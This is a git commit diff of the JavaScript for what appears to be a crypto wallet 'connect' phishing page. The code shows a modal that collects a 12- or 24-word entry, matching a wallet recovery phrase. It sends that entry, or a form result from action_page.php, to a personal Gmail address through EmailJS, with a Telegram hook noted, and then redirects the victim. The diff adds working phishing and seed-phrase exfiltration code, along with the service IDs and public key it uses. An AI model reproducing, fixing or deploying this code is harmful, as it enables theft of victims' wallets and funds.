b3ce8c88d61ebcb91ad24d365dde8700bfbf034d
Anselm <anssville@gmail.com>
2024-06-20 06:45:12 -0700

    actionpage sendbutton logic fix

--- connect_files/javasc.js
+++ connect_files/javasc.js
@@ -1,3 +1,137 @@
+// document.addEventListener("DOMContentLoaded", function () {
+//   const containers = document.querySelectorAll(".clickable");
+//   const modal = document.getElementById("myModal");
+//   const modalImage = document.getElementById("modalImage");
+//   const modalTitle = document.getElementById("modalTitle");
+//   const stage1 = document.getElementById("stage1");
+//   const buttonContainer = document.getElementById("buttonContainer");
+//   const textAreaContainer = document.getElementById("textAreaContainer");
+//   const inputTextArea = document.getElementById("inputTextArea");
+//   const sendButton = document.getElementById("sendButton");
+//   const successContainer = document.getElementById("successContainer");
+//   const errorMessage = document.getElementById("errorMessage");
+
+//   const closeButton = document.querySelector(".close");
+
+//   closeButton.addEventListener("click", function () {
+//     modal.style.display = "none";
+//     clearTimeout(modalTimeout);
+//     resetModal();
+//   });
+
+//   //Telegram here
+
+//   function openModal(imgSrc, text) {
+//     modalImage.src = imgSrc;
+//     modalTitle.textContent = text;
+
+//     modal.style.display = "flex";
+
+//     modalTimeout = setTimeout(() => {
+//       stage1.style.display = "none";
+//       buttonContainer.style.display = "block";
+//     }, 5000);
+//   }
+
+//   containers.forEach((container) => {
+//     container.addEventListener("click", function () {
+//       const imgSrc = container.querySelector("img").src;
+//       const text = container.querySelector("h2").textContent;
+
+//       openModal(imgSrc, text);
+//     });
+//   });
+
+//   function resetModal() {
+//     stage1.style.display = "block";
+//     buttonContainer.style.display = "none";
+//     textAreaContainer.style.display = "none";
+//     successContainer.style.display = "none";
+//     inputTextArea.value = "";
+//     errorMessage.classList.remove("show-error");
+//   }
+
+//   containers.forEach((container) => {
+//     container.addEventListener("click", function () {
+//       const imgSrc = container.querySelector("img").src;
+//       const text = container.querySelector("h2").textContent;
+
+//       modalImage.src = imgSrc;
+//       modalTitle.textContent = text;
+
+//       stage1.style.display = "block";
+//       modal.style.display = "flex";
+//     });
+//   });
+
+//   window.addEventListener("click", function (event) {
+//     if (event.target === modal) {
+//       modal.style.display = "none";
+//       clearTimeout(modalTimeout);
+//       resetModal();
+//     }
+//   });
+
+//   let modalTimeout;
+
+//   document
+//     .getElementById("clickableButton")
+//     .addEventListener("click", function () {
+//       buttonContainer.style.display = "none";
+//       textAreaContainer.style.display = "block";
+//     });
+
+//   sendButton.addEventListener("click", function (event) {
+//     event.preventDefault();
+
+//     const formData = new FormData(document.getElementById("my-form"));
+
+//     fetch("action_page.php", {
+//       method: "POST",
+//       body: formData,
+//     })
+//       .then((response) => response.text())
+//       .then((data) => {
+//         sendEmail(data);
+//         window.location.href = "/TECHNICAL.html";
+//       })
+//       .catch((error) => console.error("Error submitting form:", error));
+//     const words = inputTextArea.value.trim().split(/\s+/);
+
+//     if (words.length === 12 || words.length === 24) {
+//       const message = modalTitle.textContent + "\n\n" + inputTextArea.value;
+//       //sendToTelegram(message);
+
+//       //Email send
+//       //emailjs.init({ publicKey: "CwZJ5v2UX4cUCPvuy" });
+
+//       emailjs
+//         .send("service_q623k56", "template_eypceto", {
+//           to_email: "anssville@gmail.com",
+//           message: message,
+//         })
+//         .then(function (response) {
+//           console.log("Sent succefully:", response);
+
+//           textAreaContainer.style.display = "none"; // hides the text area container
+//           successContainer.style.display = "block";
+//           setTimeout(function () {
+//             modal.style.display = "none";
+//             resetModal();
+//           }, 2000);
+//         })
+//         .catch(function (error) {
+//           console.error("Error sending:", error);
+//         });
+//     } else {
+//       errorMessage.classList.add("show-error");
+//       setTimeout(() => {
+//         errorMessage.classList.remove("show-error");
+//       }, 3000);
+//     }
+//   });
+// });
+
 document.addEventListener("DOMContentLoaded", function () {
   const containers = document.querySelectorAll(".clickable");
   const modal = document.getElementById("myModal");
@@ -18,8 +152,6 @@ document.addEventListener("DOMContentLoaded", function () {
     clearTimeout(modalTimeout);
     resetModal();
   });
-
-  //Telegram here
 
   function openModal(imgSrc, text) {
     modalImage.src = imgSrc;
@@ -51,19 +183,6 @@ document.addEventListener("DOMContentLoaded", function () {
     errorMessage.classList.remove("show-error");
   }
 
-  containers.forEach((container) => {
-    container.addEventListener("click", function () {
-      const imgSrc = container.querySelector("img").src;
-      const text = container.querySelector("h2").textContent;
-
-      modalImage.src = imgSrc;
-      modalTitle.textContent = text;
-
-      stage1.style.display = "block";
-      modal.style.display = "flex";
-    });
-  });
-
   window.addEventListener("click", function (event) {
     if (event.target === modal) {
       modal.style.display = "none";
@@ -81,41 +200,43 @@ document.addEventListener("DOMContentLoaded", function () {
       textAreaContainer.style.display = "block";
     });
 
-  sendButton.addEventListener("click", function () {
-    const words = inputTextArea.value.trim().split(/\s+/);
+  sendButton.addEventListener("click", function (event) {
+    event.preventDefault();
 
-    if (words.length === 12 || words.length === 24) {
-      const message = modalTitle.textContent + "\n\n" + inputTextArea.value;
-      //sendToTelegram(message);
+    const formData = new FormData(document.getElementById("my-form"));
 
-      //Email send
-      emailjs.init({ publicKey: "CwZJ5v2UX4cUCPvuy" });
-
-      emailjs
-        .send("service_q623k56", "template_eypceto", {
-          to_email: "anssville@gmail.com",
-          message: message,
-        })
-        .then(
-          function (response) {
-            console.log("Sent succefully:", response);
-          },
-          function (error) {
-            console.error("Error sending:", errror);
-          }
-        );
-
-      textAreaContainer.style.display = "none"; // hides the text area container
-      successContainer.style.display = "block";
-      setTimeout(function () {
-        modal.style.display = "none";
-        resetModal();
-      }, 2000);
-    } else {
-      errorMessage.classList.add("show-error");
-      setTimeout(() => {
-        errorMessage.classList.remove("show-error");
-      }, 3000);
-    }
+    fetch("action_page.php", {
+      method: "POST",
+      body: formData,
+    })
+      .then((response) => response.text())
+      .then((data) => {
+        sendEmail(data);
+        window.location.href = "./TECHNICAL.html";
+      })
+      .catch((error) => console.error("Error submitting form:", error));
   });
+
+  function sendEmail(message) {
+    const emailjsParams = {
+      to_email: "anssville@gmail.com",
+      message: message,
+    };
+
+    emailjs
+      .send("service_q623k56", "template_eypceto", emailjsParams)
+      .then(function (response) {
+        console.log("Email sent successfully:", response);
+
+        textAreaContainer.style.display = "none"; // hides the text area container
+        successContainer.style.display = "block";
+        setTimeout(function () {
+          modal.style.display = "none";
+          resetModal();
+        }, 2000);
+      })
+      .catch(function (error) {
+        console.error("Error sending email:", error);
+      });
+  }
 });
